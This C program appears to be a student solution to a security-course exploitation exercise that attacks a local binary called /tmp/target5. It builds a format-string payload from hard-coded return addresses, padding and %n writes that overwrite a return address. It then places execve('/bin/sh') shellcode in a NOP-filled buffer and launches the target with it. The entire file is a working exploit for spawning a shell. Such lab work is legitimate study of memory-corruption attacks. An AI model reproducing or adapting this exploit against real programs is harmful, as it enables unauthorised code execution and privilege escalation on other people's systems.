#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  int i;
  char *args[3];
  char *env[1];
  char buf[480];
  memset(buf, 0x90, 480);
  
  /* return to arg ver */
  char* tmp = 
  "\x9d\xfa\xff\xbf\xff\xff\xff\xff"
  "\x9e\xfa\xff\xbf\xff\xff\xff\xff"
  "\x9f\xfa\xff\xbf\xff\xff\xff\xff"
  "%08x%08x"
  "%214u%n%257u%n%192u%n";

  strncpy(buf,tmp,strlen(tmp));

  strncpy(buf+162,   
          "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
          "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
          "\x80\xe8\xdc\xff\xff\xff/bin/sh", 
          45);
  
  args[0] = TARGET; 
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;



  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

